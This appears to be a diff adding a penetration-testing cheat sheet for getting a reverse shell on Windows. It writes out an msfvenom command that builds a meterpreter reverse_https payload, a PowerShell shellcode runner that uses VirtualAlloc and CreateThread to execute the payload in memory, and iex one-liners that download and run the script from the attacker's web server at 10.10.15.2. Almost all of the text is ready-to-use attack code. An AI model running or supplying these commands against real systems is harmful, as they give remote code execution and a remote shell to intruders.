@@ -1,0 +1,33 @@
+Generate a ps1 payload with msfvenom
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.2 LPORT=443 EXITFUNC=thread -f ps1
+
+create a shellcode.ps1 file in the web server directory on the attack machine
+
+touch /var/www/html/shellcode.ps1 
+
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Kernel32 {
+[DllImport("kernel32")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32", CharSet=CharSet.Ansi)]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+}
+"@
+Add-Type $Kernel32
+[Byte[]] $buf = <PASTE HERE>
+$size = $buf.Length
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+
+start the apache2 server and your listener
+
+download and execute the powershell script
+
+iex (New-Object Net.WebClient).DownloadString('http://10.10.15.2/shellcode.ps1')
+        -- OR -- 
+iex (iwr ('http://10.10.15.2/shellcode.ps1') -UseBasicParsing)
+
